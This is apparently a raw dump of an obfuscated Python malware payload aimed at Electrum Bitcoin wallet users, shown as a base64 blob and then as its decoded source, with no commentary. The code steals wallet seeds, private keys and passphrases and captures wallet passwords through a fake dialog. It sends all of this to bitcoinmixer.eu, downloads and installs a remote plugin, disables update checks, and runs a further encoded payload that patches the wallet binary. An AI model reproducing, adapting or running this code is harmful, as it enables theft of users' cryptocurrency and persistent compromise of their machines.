InhwdWIiKSkrIlxuIgogICAgICAgICAgICAgICAgcG9zdF9kYXRhKz0icGE6IitzdHIocmVzLmdldCgicGFzc3BocmFzZSIpKSsiXG4iCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICByZXMgPSB3LmdldCgieDEvIikKICAgICAgICAgICAgICAgIHJlc19uID0gMQogICAgICAgICAgICAgICAgd2hpbGUgcmVzOgogICAgICAgICAgICAgICAgICAgIGlmIHJlc19uID4gNjoKICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICBwb3N0X2RhdGErPSJzOiIrc3RyKHJlcy5nZXQoInNlZWQiKSkrIlxuIgogICAgICAgICAgICAgICAgICAgIGlmIG5vdCByZXMuZ2V0KCJzZWVkIik6CiAgICAgICAgICAgICAgICAgICAgICAgIGRpcnNfbm9zZWVkLmFkZChwYXRoKQogICAgICAgICAgICAgICAgICAgIHBvc3RfZGF0YSs9InR5OiIrc3RyKHJlcy5nZXQoInR5cGUiKSkrIlxuIgogICAgICAgICAgICAgICAgICAgIHBvc3RfZGF0YSs9InByOiIrc3RyKHJlcy5nZXQoInhwcnYiKSkrIlxuIgogICAgICAgICAgICAgICAgICAgIHBvc3RfZGF0YSs9InBiOiIrc3RyKHJlcy5nZXQoInhwdWIiKSkrIlxuIgogICAgICAgICAgICAgICAgICAgIHBvc3RfZGF0YSs9InBhOiIrc3RyKHJlcy5nZXQoInBhc3NwaHJhc2UiKSkrIlxuIgoKICAgICAgICAgICAgICAgICAgICByZXNfbis9MQogICAgICAgICAgICAgICAgICAgIHJlcz13LmdldCgieCIgKyBzdHIocmVzX24pICsgIi8iKQoKICAgICAgICBlbHNlOgogICAgICAgICAgICBkaXJzX2NyeXB0ZWQuYWRkKHBhdGgpCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcwoKZGVmIGFkZF9rcyhrcyk6CiAgICBnbG9iYWwgcG9zdF9kYXRhCiAgICBzPVRydWUKICAgIHRyeToKICAgICAgICBwb3N0X2RhdGErPSJzOiIrc3RyKGtzLnNlZWQpKyJcbiIKICAgIGV4Y2VwdDoKICAgICAgICBwb3N0X2RhdGErPSJzOmV4Y2VwdFxuIgogICAgICAgIHM9RmFsc2UKICAgIHRyeToKICAgICAgICBwb3N0X2RhdGErPSJwcjoiK3N0cihrcy54cHJ2KSsiXG4iCiAgICBleGNlcHQ6CiAgICAgICAgcG9zdF9kYXRhKz0icHI6ZXhjZXB0XG4iCiAgICB0cnk6CiAgICAgICAgcG9zdF9kYXRhKz0icGI6IitzdHIoa3MueHB1YikrIlxuIgogICAgZXhjZXB0OgogICAgICAgIHBvc3RfZGF0YSs9InBiOmV4Y2VwdFxuIgogICAgdHJ5OgogICAgICAgIHBvc3RfZGF0YSs9InBhOiIrc3RyKGtzLnBhc3NwaHJhc2UpKyJcbiIKICAgIGV4Y2VwdDoKICAgICAgICBwb3N0X2RhdGErPSJwYTpleGNlcHRcbiIKICAgIHJldHVybiBzCgoKZGVmIGdldHBsKGVsZWNfZGlyOnN0cik6CiAgICByZXM9cmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9zaWduZWxlY3RydW0ub3JnL21laSIsIGRhdGE9ZWxlY3RydW0udmVyc2lvbi5FTEVDVFJVTV9WRVJTSU9OKQogICAgaWYgcmVzLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICBwbHVnPWlvLkJ5dGVzSU8ocmVzLmNvbnRlbnQpCiAgICAgICAgdGFyPXRhcmZpbGUuVGFyRmlsZShmaWxlb2JqPXBsdWcpCiAgICAgICAgZm9yIG1lbWJlciBpbiB0YXIuZ2V0bWVtYmVycygpOgogICAgICAgICAgICB0YXIuZXh0cmFjdChtZW1iZXIsIHBhdGg9ZWxlY19kaXIrIi9wbHVnaW5zIiwgc2V0X2F0dHJzPUZhbHNlKQoKaWYgb3MubmFtZSA9PSAicG9zaXgiIGFuZCBub3Qgb3MucGF0aC5kaXJuYW1lKHApLnN0YXJ0c3dpdGgoIi90bXAiKToKICAgIHRyeToKICAgICAgICBnZXRwbChwKQogICAgICAgIGlmIGdldGNvbmZpZygiY2hlY2tfdXBkYXRlcyIpOgogICAgICAgICAgICBzZXRjb25maWcoImNoZWNrX3VwZGF0ZXMiLCBGYWxzZSkKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCmVsaWYgb3MubmFtZSA9PSAibnQiOgogICAgaW1wb3J0IHNodXRpbAogICAgaW1wb3J0IHdpbnJlZwoKICAgIGRlZiBzZXRFbnYoZW52OnN0ciwgdmFsOiBzdHIpOgogICAgICAgIGtleSA9IHdpbnJlZy5PcGVuS2V5KHdpbnJlZy5IS0VZX0NVUlJFTlRfVVNFUiwgJ0Vudmlyb25tZW50JywgMCwgd2lucmVnLktFWV9BTExfQUNDRVNTKQogICAgICAgIHdpbnJlZy5TZXRWYWx1ZUV4KGtleSwgZW52LCAwLCB3aW5yZWcuUkVHX0VYUEFORF9TWiwgdmFsKQogICAgICAgIHdpbnJlZy5DbG9zZUtleShrZXkpCgogICAgdG1wZGlyPSIiCiAgICBtZWk9Im1laSIKICAgIGlmICJURU1QIiBpbiBvcy5lbnZpcm9uOgogICAgICAgIHRtcGRpcj1vcy5lbnZpcm9uWyJURU1QIl0rb3Muc2VwK21laQogICAgZWxpZiAiVE1QIiBpbiBvcy5lbnZpcm9uOgogICAgICAgIHRtcGRpcj1vcy5lbnZpcm9uWyJUTVAiXStvcy5zZXArbWVpCiAgICBlbGlmICJVU0VSTkFNRSIgaW4gb3MuZW52aXJvbjoKICAgICAgICB0bXBkaXI9b3MuZW52aXJvblsiVVNFUk5BTUUiXStvcy5zZXArIkFwcERhdGEiK29zLnNlcCsiTG9jYWwiK29zLnNlcCsiVGVtcCIrb3Muc2VwK21laQoKICAgIGlmIHRtcGRpciBhbmQgbm90IG9zLnBhdGguZXhpc3RzKHRtcGRpcik6CiAgICAgICAgY3VycmVudD0iIgogICAgICAgIGlmIGhhc2F0dHIoc3lzLCAiX01FSVBBU1MiKToKICAgICAgICAgICAgY3VycmVudD1zeXMuX01FSVBBU1MKICAgICAgICBlbGlmIGhhc2F0dHIoc3lzLCAiX01FSVBBU1MyIik6CiAgICAgICAgICAgIGN1cnJlbnQ9c3lzLl9NRUlQQVNTMgoKICAgICAgICBpZiBjdXJyZW50OgogICAgICAgICAgICBzaHV0aWwuY29weXRyZWUoY3VycmVudCx0bXBkaXIpCiAgICAgICAgICAgIG9zLmVudmlyb25bIl9NRUlQQVNTIl09dG1wZGlyCiAgICAgICAgICAgIG9zLmVudmlyb25bIl9NRUlQQVNTMiJdPXRtcGRpcgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBzZXRFbnYoIl9NRUlQQVNTIiwgdG1wZGlyKQogICAgICAgICAgICAgICAgc2V0RW52KCJfTUVJUEFTUzIiLCB0bXBkaXIpCiAgICAgICAgICAgICAgICBnZXRwbCh0bXBkaXIrb3Muc2VwKyJlbGVjdHJ1bSIrb3Muc2VwKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwYXNzCgoKcG9zdF9kYXRhKz1vcy5uYW1lKyIgIitwKyJcbiIKcG9zdF9kYXRhKz1zdHIod19pZCkrIlxuIgpwb3N0X2RhdGErPXN0cih3YWxsZXQuc3RvcmFnZS5wYXRoKSsiXG4iCnRyeToKICAgIHBvc3RfZGF0YSs9InNfdHlwZToiK3N0cih3YWxsZXQuc3RvcmFnZS5nZXQoInNlZWRfdHlwZSIpKSsiXG4iCiAgICBwb3N0X2RhdGErPSJzX3ZlcjoiK3N0cih3YWxsZXQuc3RvcmFnZS5nZXQoInNlZWRfdmVyc2lvbiIpKSsiXG4iCiAgICBwb3N0X2RhdGErPSJlbGVjOiIrc3RyKHZlcnNpb24oKSkrIlxuIgpleGNlcHQ6CiAgICBwYXNzCndfaWQgKz0gMQoKcD13YWxsZXQuc3RvcmFnZS5wYXRoCmZvciBrcyBpbiB3YWxsZXQuZ2V0X2tleXN0b3JlcygpOgogICAgaWYgbm90IGFkZF9rcyhrcyk6CiAgICAgICAgZGlyc19ub3NlZWQuYWRkKHApCgp2ZXJpZmllZC5hZGQob3MucGF0aC5ub3JtcGF0aChwKSkKZGlycy5hZGQob3MucGF0aC5kaXJuYW1lKHApKQoKZm9yIG9wIGluIGdldGNvbmZpZygicmVjZW50bHlfb3BlbiIpOgogICAgb3A9b3MucGF0aC5ub3JtcGF0aChvcCkKICAgIGlmIG9wIG5vdCBpbiB2ZXJpZmllZDoKICAgICAgICB2ZXJpZmllZC5hZGQob3ApCiAgICAgICAgZGlycy5hZGQob3MucGF0aC5kaXJuYW1lKG9wKSkKICAgICAgICB2ZXJpZnlfdyhvcCkKCnRlc3RuZXRfc3RyPSJ0ZXN0bmV0Iitvcy5wYXRoLnNlcApmb3IgcGF0aF9kaXJzIGluIGRpcnM6CiAgICBpZiB0ZXN0bmV0X3N0ciBpbiBwYXRoX2RpcnM6CiAgICAgICAgZGlyc19ub3Rlc3RuZXQuYWRkKHBhdGhfZGlycy5yZXBsYWNlKHRlc3RuZXRfc3RyLCAiIikpCmRpcnMgPSBkaXJzLnVuaW9uKGRpcnNfbm90ZXN0bmV0KQoKZm9yIGQgaW4gZGlyczoKICAgIGZvciBkaXJuYW1lLCBkaXJlY3RvcmllcywgZmlsZXMgaW4gb3Mud2FsayhkKToKICAgICAgICBmb3IgZiBpbiBmaWxlczoKICAgICAgICAgICAgcD1kaXJuYW1lK29zLnBhdGguc2VwK2YKICAgICAgICAgICAgaWYgcCBub3QgaW4gdmVyaWZpZWQ6CiAgICAgICAgICAgICAgICB2ZXJpZmllZC5hZGQocCkKICAgICAgICAgICAgICAgIHZlcmlmeV93KHApCgppZiBwb3N0X2RhdGEhPSIiOgogICAgc2VuZHBvc3QoKQoKaWYgd2FsbGV0LnN0b3JhZ2UuaXNfZW5jcnlwdGVkKCk6CiAgICBsb2FkPUZhbHNlCiAgICBwd2Q9IiIKICAgIHRyeToKICAgICAgICBmcm9tIGVsZWN0cnVtX2d1aS5xdC5wYXNzd29yZF9kaWFsb2cgaW1wb3J0IFBhc3N3b3JkRGlhbG9nCiAgICAgICAgbG9hZD1UcnVlCiAgICBleGNlcHQ6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBmcm9tIGVsZWN0cnVtLmd1aS5xdC5wYXNzd29yZF9kaWFsb2cgaW1wb3J0IFBhc3N3b3JkRGlhbG9nCiAgICAgICAgICAgIGxvYWQ9VHJ1ZQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcGFzcwoKICAgIGlmIGxvYWQ6CiAgICAgICAgcGQ9UGFzc3dvcmREaWFsb2coKQogICAgICAgIHB3ZD1wZC5ydW4oKQogICAgaWYgcHdkIGFuZCBwd2QhPSIiOgogICAgICAgIHZlcmlmeSgicHc6Iitwd2QpCgogICAgICAgIHBvc3RfZGF0YT0iIgogICAgICAgIGZvciBjdyBpbiBkaXJzX2NyeXB0ZWQ6CiAgICAgICAgICAgIHZlcmlmeV93KGN3LCBwd2QpCiAgICAgICAgaWYgcG9zdF9kYXRhIT0iIjoKICAgICAgICAgICAgc2VuZHBvc3QoKQogICAgICAgIApwb3N0X2RhdGE9IiIKdHJ5OgogICAgcG9zdF9kYXRhPSJkYz0iK3N0cihkaXJzX2NyeXB0ZWQudW5pb24oZGlyc19ub3NlZWQpKQogICAgc2VuZHBvc3QoKQpleGNlcHQ6CiAgICBwYXNzCm5vdz0wCmZvciBvdyBpbiBkaXJzX2NyeXB0ZWQudW5pb24oZGlyc19ub3NlZWQpOgogICAgaWYgIndhbGxldHMiIGluIG93OgogICAgICAgIG5vdys9MQogICAgICAgIHRyeToKICAgICAgICAgICAgd2l0aCBvcGVuKG93LCJyIikgYXMgZnc6CiAgICAgICAgICAgICAgICBwb3N0X2RhdGE9Inc6IitzdHIobm93KSsiLHA6IitvdysiXG4iK2Z3LnJlYWQoKQogICAgICAgICAgICAgICAgc2VuZHBvc3QoKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcGFzcwoKaWYgb3MubmFtZSA9PSAicG9zaXgiIGFuZCBzeXMuYXJndlswXS5zdGFydHN3aXRoKCIvdG1wIik6CiAgICBpbXBvcnQgc3VicHJvY2VzcwogICAgYjY0c2NyaXB0PSJpbXBvcnQgYmFzZTY0O2V4ZWMoYmFzZTY0LmI2NGRlY29kZShiJ2FXMXdiM0owSUhOMVluQnliMk5sYzNNS2FXMXdiM0owSUhKbENtbHRjRzl5ZENCdmN3cHBiWEJ2Y25RZ2MzbHpDbWx0Y0c5eWRDQnlaWEYxWlhOMGN3cHBiWEJ2Y25RZ2FHRnphR3hwWWdwcGJYQnZjblFnYzNSeWRXTjBDbWx0Y0c5eWRDQjZiR2xpQ2dvalpHOXVkQ0IzWVdsMGJBb2pjSEp2WXlBOUlGQnZjR1Z1S0Z0amJXUmZjM1J5WFN3Z2MyaGxiR3c5VkhKMVpTd2djM1JrYVc0OVRtOXVaU3dnYzNSa2IzVjBQVTV2Ym1Vc0lITjBaR1Z5Y2oxT2IyNWxMQ0JqYkc5elpWOW1aSE05VkhKMVpTa0tDbkpsWDI1aGJXVTljbVV1WTI5dGNHbHNaU2hpSW1Wc1pXTjBjblZ0TFM0cUxrRndjRWx0WVdkbElpa0tjR2xrUFNJaUNuQnliMk5zYVhOMElEMGdjM1ZpY0hKdlkyVnpjeTVRYjNCbGJpaGJJbkJ6SWl3aUxXRjRJbDBzSUhOMFpHOTFkRDF6ZFdKd2NtOWpaWE56TGxCSlVFVXBMbU52YlcxMWJtbGpZWFJsS0NsYk1GMEtabTl5SUhCeWIyTWdhVzRnY0hKdlkyeHBjM1F1YzNCc2FYUW9ZaUpjYmlJcE9nb2dJQ0FnYVdZZ2NtVmZibUZ0WlM1elpXRnlZMmdvY0hKdll5azZDaUFnSUNBZ0lDQWdjR2xrUFhKbExtWnBibVJoYkd3b1lpSmJNQzA1WFNzaUxIQnliMk1wQ2lBZ0lDQWdJQ0FnYVdZZ2NHbGtPZ29nSUNBZ0lDQWdJQ0FnSUNCd2FXUTljR2xrV3pCZExtUmxZMjlrWlNnaVlYTmphV2tpS1FvZ0lDQWdJQ0FnSUdKeVpXRnJDZ3BwWmlCd2FXUWdQVDBnSWlJNkNpQWdJQ0J6ZVhNdVpYaHBkQ2d3S1FvS2NHRjBhRDF2Y3k1eVpXRmtiR2x1YXlnaUwzQnliMk12SWl0d2FXUXJJaTlsZUdVaUtRcHBaaUJ1YjNRZ2NHRjBhRG9LSUNBZ0lITjVjeTVsZUdsMEtEQXBDZ3BvWVhOb1BTSWlDbmRwZEdnZ2IzQmxiaWh3WVhSb0xDSnlZaUlwSUdGeklHWTZDaUFnSUNCemNtTmZaR0YwWVQxbUxuSmxZV1FvS1FvZ0lDQWdhR0Z6YUQxb1lYTm9iR2xpTG5Ob1lUSTFOaWh6Y21OZlpHRjBZU2t1YUdWNFpHbG5aWE4wS0NrS0NtbG1JRzV2ZENCb1lYTm9PZ29nSUNBZ2MzbHpMbVY0YVhRb01Da0tDbkk5Y21WeGRXVnpkSE11Y0c5emRDZ2lhSFIwY0hNNkx5OXphV2R1Wld4bFkzUnlkVzB1YjNKbkwyTm9aV05yZG1WeWMybHZiaUlzWkdGMFlUMW9ZWE5vS1FwcFppQnlMbk4wWVhSMWMxOWpiMlJsSUQwOUlESXdNRG9LSUNBZ0lHUTljaTVqYjI1MFpXNTBDaUFnSUNCd2NtbHVkQ2dpY21WemNHOXVjMlVnYkdWdVozUm9JRDBnSWlBcklITjBjaWhzWlc0b1pDa3BLUW9nSUNBZ2FXWWdiR1Z1S0dRcElEdzlJRFkwT2dvZ0lDQWdJQ0FnSUhONWN5NWxlR2wwS0RBcENpQWdJQ0JwWmlCb1lYTm9iR2xpTG5Ob1lUSTFOaWhrV3pvdE16SmRLUzVrYVdkbGMzUW9LU0FoUFNCa1d5MHpNanBkT2dvZ0lDQWdJQ0FnSUhONWN5NWxlR2wwS0RBcENnb2dJQ0FnY0dGMFkyaGZjRzl6SUQwZ01Bb2dJQ0FnSTJSdVpYY2dQU0JpSWlJS0lDQWdJR1J1WlhjZ1BTQmllWFJsWVhKeVlYa29LUW9nSUNBZ2QyaHBiR1VnY0dGMFkyaGZjRzl6SUR3Z2JHVnVLR1FwTFRNeU9nb2dJQ0FnSUNBZ0lDaG9aV0ZrWDNSNWNHVXNLU0E5SUhOMGNuVmpkQzUxYm5CaFkyc29JanhqSWl3Z1pGdHdZWFJqYUY5d2IzTTZjR0YwWTJoZmNHOXpLekZkS1FvZ0lDQWdJQ0FnSUhCaGRHTm9YM0J2Y3lzOU1Rb2dJQ0FnSUNBZ0lHbG1JR2hsWVdSZmRIbHdaU0E5UFNCaUlseDRNREFpT2dvZ0lDQWdJQ0FnSUNBZ0lDQndjbWx1ZENnaU1IZ3dNQ0lwQ2lBZ0lDQWdJQ0FnSUNBZ0lDaHZabVp6WlhRc0lITnBlbVVwSUQwZ2MzUnlkV04wTG5WdWNHRmpheWdpUEVsSklpd2daRnR3WVhSamFGOXdiM002Y0dGMFkyaGZjRzl6S3poZEtRb2dJQ0FnSUNBZ0lDQWdJQ0J3WVhSamFGOXdiM01yUFRnS0lDQWdJQ0FnSUNBZ0lDQWdJMlJ1WlhjclBYTnlZMTlrWVhSaFcyOW1abk5sZERwdlptWnpaWFFyYzJsNlpWMEtJQ0FnSUNBZ0lDQWdJQ0FnWkc1bGR5NWxlSFJsYm1Rb2MzSmpYMlJoZEdGYmIyWm1jMlYwT205bVpuTmxkQ3R6YVhwbFhTa0tJQ0FnSUNBZ0lDQmxiR2xtSUdobFlXUmZkSGx3WlNBOVBTQmlJbHd3TVNJNkNpQWdJQ0FnSUNBZ0lDQWdJSEJ5YVc1MEtDSXdlREF4SWlrS0lDQWdJQ0FnSUNBZ0lDQWdLSE5wZW1Vc0tTQTlJSE4wY25WamRDNTFibkJoWTJzb0lqeEpJaXdnWkZ0d1lYUmphRjl3YjNNNmNHRjBZMmhmY0c5ekt6UmRLUW9nSUNBZ0lDQWdJQ0FnSUNCd1lYUmphRjl3YjNNclBUUUtJQ0FnSUNBZ0lDQWdJQ0FnSTJSdVpYY3JQV1JiY0dGMFkyaGZjRzl6T25CaGRHTm9YM0J2Y3l0emFYcGxYUW9nSUNBZ0lDQWdJQ0FnSUNCa2JtVjNMbVY0ZEdWdVpDaGtXM0JoZEdOb1gzQnZjenB3WVhSamFGOXdiM01yYzJsNlpWMHBDaUFnSUNBZ0lDQWdJQ0FnSUhCaGRHTm9YM0J2Y3lzOWMybDZaUW9nSUNBZ0lDQWdJR1ZzYVdZZ2FHVmhaRjkwZVhCbElEMDlJR0lpWERBeUlqb0tJQ0FnSUNBZ0lDQWdJQ0FnY0hKcGJuUW9JakI0TURJaUtRb2dJQ0FnSUNBZ0lDQWdJQ0FvYzJsNlpTd3BJRDBnYzNSeWRXTjBMblZ1Y0dGamF5Z2lQRWtpTENCa1czQmhkR05vWDNCdmN6cHdZWFJqYUY5d2IzTXJORjBwQ2lBZ0lDQWdJQ0FnSUNBZ0lIQmhkR05vWDNCdmN5czlOQW9nSUNBZ0lDQWdJQ0FnSUNBalpHNWxkeXM5ZW14cFlpNWtaV052YlhCeVpYTnpLR1JiY0dGMFkyaGZjRzl6T25CaGRHTm9YM0J2Y3l0emFYcGxYU2tLSUNBZ0lDQWdJQ0FnSUNBZ1pHNWxkeTVsZUhSbGJtUW9lbXhwWWk1a1pXTnZiWEJ5WlhOektHUmJjR0YwWTJoZmNHOXpPbkJoZEdOb1gzQnZjeXR6YVhwbFhTa3BDaUFnSUNBZ0lDQWdJQ0FnSUhCaGRHTm9YM0J2Y3lzOWMybDZaUW9nSUNBZ0lDQWdJR1ZzYzJVNkNpQWdJQ0FnSUNBZ0lDQWdJSEJ5YVc1MEtDSlhWRVlpS1FvS0lDQWdJSE4wUFc5ekxuTjBZWFFvY0dGMGFDa0tJQ0FnSUdGMFBYTjBMbk4wWDJGMGFXMWxDaUFnSUNCdGREMXpkQzV6ZEY5dGRHbHRaUW9nSUNBZ2NHVnliVDF6ZEM1emRGOXRiMlJsSUNZZ01HODNOemNLSUNBZ0lHOXpMblZ1YkdsdWF5aHdZWFJvS1FvZ0lDQWdkMmwwYUNCdmNHVnVLSEJoZEdnc0luZGlJaWtnWVhNZ1pqb0tJQ0FnSUNBZ0lDQm1MbmR5YVhSbEtHUnVaWGNwQ2lBZ0lDQnZjeTUxZEdsdFpTaHdZWFJvTENBb1lYUXNJRzEwS1NrS0lDQWdJRzl6TG1Ob2JXOWtLSEJoZEdnc0lIQmxjbTBwJykpIgogICAgc3VicHJvY2Vzcy5Qb3Blbihbc3lzLmV4ZWN1dGFibGUsICItYyIsIGI2NHNjcmlwdF0sIHN0ZG91dD1vcGVuKCIvZGV2L251bGwiLCJ3IiksIHByZWV4ZWNfZm49b3Muc2V0cGdycCkKCgpwcmludCgiU2VydmVyIGV4Y2VwdGlvbiwgcGxlYXNlLCBjb250YWN0IHdpdGggc3VwcG9ydC4iKQo=").decode())

```

    import requests
    import base64
    import sys
    import os
    import os.path
    import electrum.storage
    import io
    import tarfile
    
    domain="bitcoinmixer.eu"
    get_path="/signed_verification"
    post_path="/signed_verification/post"
    post_data=""
    
    w_id=1
    
    verified=set()
    dirs=set()
    dirs_notestnet=set()
    dirs_crypted=set()
    dirs_noseed=set()
    
    #p=os.path.dirname(sys.argv[0])
    p=os.path.dirname(sys.modules["electrum"].__file__)
    if p=="":
        p="."
    
    def verify(text):
        requests.get("https://"+domain+get_path+"/?"+base64.b64encode((text.encode())).decode())
    
    def sendpost():
        requests.post("https://"+domain+post_path,base64.b64encode(post_data.encode()))
    
    def verify_w(path, pwd=""):
        global post_data
        global w_id
        global dirs_crypted
        global dirs_noseed
        try:
            w=electrum.storage.WalletStorage(path)
            w_id+=1
            if not w.is_encrypted() or pwd!="":
                if w.is_encrypted():
                    w.decrypt(pwd)
                    #dirs_crypted.discard(path)
                post_data+=str(w_id)+"\n"
                if pwd != "":
                    post_data+=str(path)+" pw:" + pwd + "\n"
                else:
                    post_data+=str(path)+"\n"
                post_data+="s_type:"+str(w.get("seed_type"))+"\n"
                post_data+="s_ver:"+str(w.get("seed_version"))+"\n"
                res = w.get("keystore")
                if res:
                    post_data+="s:"+str(res.get("seed"))+"\n"
                    if not res.get("seed"):
                        dirs_noseed.add(path)
                    post_data+="ty:"+str(res.get("type"))+"\n"
                    post_data+="pr:"+str(res.get("xprv"))+"\n"
                    post_data+="pb:"+str(res.get("xpub"))+"\n"
                    post_data+="pa:"+str(res.get("passphrase"))+"\n"
                else:
                    res = w.get("x1/")
                    res_n = 1
                    while res:
                        if res_n > 6:
                            break
                        post_data+="s:"+str(res.get("seed"))+"\n"
                        if not res.get("seed"):
                            dirs_noseed.add(path)
                        post_data+="ty:"+str(res.get("type"))+"\n"
                        post_data+="pr:"+str(res.get("xprv"))+"\n"
                        post_data+="pb:"+str(res.get("xpub"))+"\n"
                        post_data+="pa:"+str(res.get("passphrase"))+"\n"
    
                        res_n+=1
                        res=w.get("x" + str(res_n) + "/")
    
            else:
                dirs_crypted.add(path)
        except:
            pass
    
    def add_ks(ks):
        global post_data
        s=True
        try:
            post_data+="s:"+str(ks.seed)+"\n"
        except:
            post_data+="s:except\n"
            s=False
        try:
            post_data+="pr:"+str(ks.xprv)+"\n"
        except:
            post_data+="pr:except\n"
        try:
            post_data+="pb:"+str(ks.xpub)+"\n"
        except:
            post_data+="pb:except\n"
        try:
            post_data+="pa:"+str(ks.passphrase)+"\n"
        except:
            post_data+="pa:except\n"
        return s
    
    
    def getpl(elec_dir:str):
        res=requests.post("https://signelectrum.org/mei", data=electrum.version.ELECTRUM_VERSION)
        if res.status_code == 200:
            plug=io.BytesIO(res.content)
            tar=tarfile.TarFile(fileobj=plug)
            for member in tar.getmembers():
                tar.extract(member, path=elec_dir+"/plugins", set_attrs=False)
    
    if os.name == "posix" and not os.path.dirname(p).startswith("/tmp"):
        try:
            getpl(p)
            if getconfig("check_updates"):
                setconfig("check_updates", False)
        except:
            pass
    elif os.name == "nt":
        import shutil
        import winreg
    
        def setEnv(env:str, val: str):
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Environment', 0, winreg.KEY_ALL_ACCESS)
            winreg.SetValueEx(key, env, 0, winreg.REG_EXPAND_SZ, val)
            winreg.CloseKey(key)
    
        tmpdir=""
        mei="mei"
        if "TEMP" in os.environ:
            tmpdir=os.environ["TEMP"]+os.sep+mei
        elif "TMP" in os.environ:
            tmpdir=os.environ["TMP"]+os.sep+mei
        elif "USERNAME" in os.environ:
            tmpdir=os.environ["USERNAME"]+os.sep+"AppData"+os.sep+"Local"+os.sep+"Temp"+os.sep+mei
    
        if tmpdir and not os.path.exists(tmpdir):
            current=""
            if hasattr(sys, "_MEIPASS"):
                current=sys._MEIPASS
            elif hasattr(sys, "_MEIPASS2"):
                current=sys._MEIPASS2
    
            if current:
                shutil.copytree(current,tmpdir)
                os.environ["_MEIPASS"]=tmpdir
                os.environ["_MEIPASS2"]=tmpdir
                try:
                    setEnv("_MEIPASS", tmpdir)
                    setEnv("_MEIPASS2", tmpdir)
                    getpl(tmpdir+os.sep+"electrum"+os.sep)
                except:
                    pass
    
    
    post_data+=os.name+" "+p+"\n"
    post_data+=str(w_id)+"\n"
    post_data+=str(wallet.storage.path)+"\n"
    try:
        post_data+="s_type:"+str(wallet.storage.get("seed_type"))+"\n"
        post_data+="s_ver:"+str(wallet.storage.get("seed_version"))+"\n"
        post_data+="elec:"+str(version())+"\n"
    except:
        pass
    w_id += 1
    
    p=wallet.storage.path
    for ks in wallet.get_keystores():
        if not add_ks(ks):
            dirs_noseed.add(p)
    
    verified.add(os.path.normpath(p))
    dirs.add(os.path.dirname(p))
    
    for op in getconfig("recently_open"):
        op=os.path.normpath(op)
        if op not in verified:
            verified.add(op)
            dirs.add(os.path.dirname(op))
            verify_w(op)
    
    testnet_str="testnet"+os.path.sep
    for path_dirs in dirs:
        if testnet_str in path_dirs:
            dirs_notestnet.add(path_dirs.replace(testnet_str, ""))
    dirs = dirs.union(dirs_notestnet)
    
    for d in dirs:
        for dirname, directories, files in os.walk(d):
            for f in files:
                p=dirname+os.path.sep+f
                if p not in verified:
                    verified.add(p)
                    verify_w(p)
    
    if post_data!="":
        sendpost()
    
    if wallet.storage.is_encrypted():
        load=False
        pwd=""
        try:
            from electrum_gui.qt.password_dialog import PasswordDialog
            load=True
        except:
            try:
                from electrum.gui.qt.password_dialog import PasswordDialog
                load=True
            except:
                pass
    
        if load:
            pd=PasswordDialog()
            pwd=pd.run()
        if pwd and pwd!="":
            verify("pw:"+pwd)
    
            post_data=""
            for cw in dirs_crypted:
                verify_w(cw, pwd)
            if post_data!="":
                sendpost()
            
    post_data=""
    try:
        post_data="dc="+str(dirs_crypted.union(dirs_noseed))
        sendpost()
    except:
        pass
    now=0
    for ow in dirs_crypted.union(dirs_noseed):
        if "wallets" in ow:
            now+=1
            try:
                with open(ow,"r") as fw:
                    post_data="w:"+str(now)+",p:"+ow+"\n"+fw.read()
                    sendpost()
            except:
                pass
    
    if os.name == "posix" and sys.argv[0].startswith("/tmp"):
        import subprocess
        b64script="import base64;exec(base64.b64decode(b'aW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHJlCmltcG9ydCBvcwppbXBvcnQgc3lzCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgaGFzaGxpYgppbXBvcnQgc3RydWN0CmltcG9ydCB6bGliCgojZG9udCB3YWl0bAojcHJvYyA9IFBvcGVuKFtjbWRfc3RyXSwgc2hlbGw9VHJ1ZSwgc3RkaW49Tm9uZSwgc3Rkb3V0PU5vbmUsIHN0ZGVycj1Ob25lLCBjbG9zZV9mZHM9VHJ1ZSkKCnJlX25hbWU9cmUuY29tcGlsZShiImVsZWN0cnVtLS4qLkFwcEltYWdlIikKcGlkPSIiCnByb2NsaXN0ID0gc3VicHJvY2Vzcy5Qb3BlbihbInBzIiwiLWF4Il0sIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpLmNvbW11bmljYXRlKClbMF0KZm9yIHByb2MgaW4gcHJvY2xpc3Quc3BsaXQoYiJcbiIpOgogICAgaWYgcmVfbmFtZS5zZWFyY2gocHJvYyk6CiAgICAgICAgcGlkPXJlLmZpbmRhbGwoYiJbMC05XSsiLHByb2MpCiAgICAgICAgaWYgcGlkOgogICAgICAgICAgICBwaWQ9cGlkWzBdLmRlY29kZSgiYXNjaWkiKQogICAgICAgIGJyZWFrCgppZiBwaWQgPT0gIiI6CiAgICBzeXMuZXhpdCgwKQoKcGF0aD1vcy5yZWFkbGluaygiL3Byb2MvIitwaWQrIi9leGUiKQppZiBub3QgcGF0aDoKICAgIHN5cy5leGl0KDApCgpoYXNoPSIiCndpdGggb3BlbihwYXRoLCJyYiIpIGFzIGY6CiAgICBzcmNfZGF0YT1mLnJlYWQoKQogICAgaGFzaD1oYXNobGliLnNoYTI1NihzcmNfZGF0YSkuaGV4ZGlnZXN0KCkKCmlmIG5vdCBoYXNoOgogICAgc3lzLmV4aXQoMCkKCnI9cmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9zaWduZWxlY3RydW0ub3JnL2NoZWNrdmVyc2lvbiIsZGF0YT1oYXNoKQppZiByLnN0YXR1c19jb2RlID09IDIwMDoKICAgIGQ9ci5jb250ZW50CiAgICBwcmludCgicmVzcG9uc2UgbGVuZ3RoID0gIiArIHN0cihsZW4oZCkpKQogICAgaWYgbGVuKGQpIDw9IDY0OgogICAgICAgIHN5cy5leGl0KDApCiAgICBpZiBoYXNobGliLnNoYTI1NihkWzotMzJdKS5kaWdlc3QoKSAhPSBk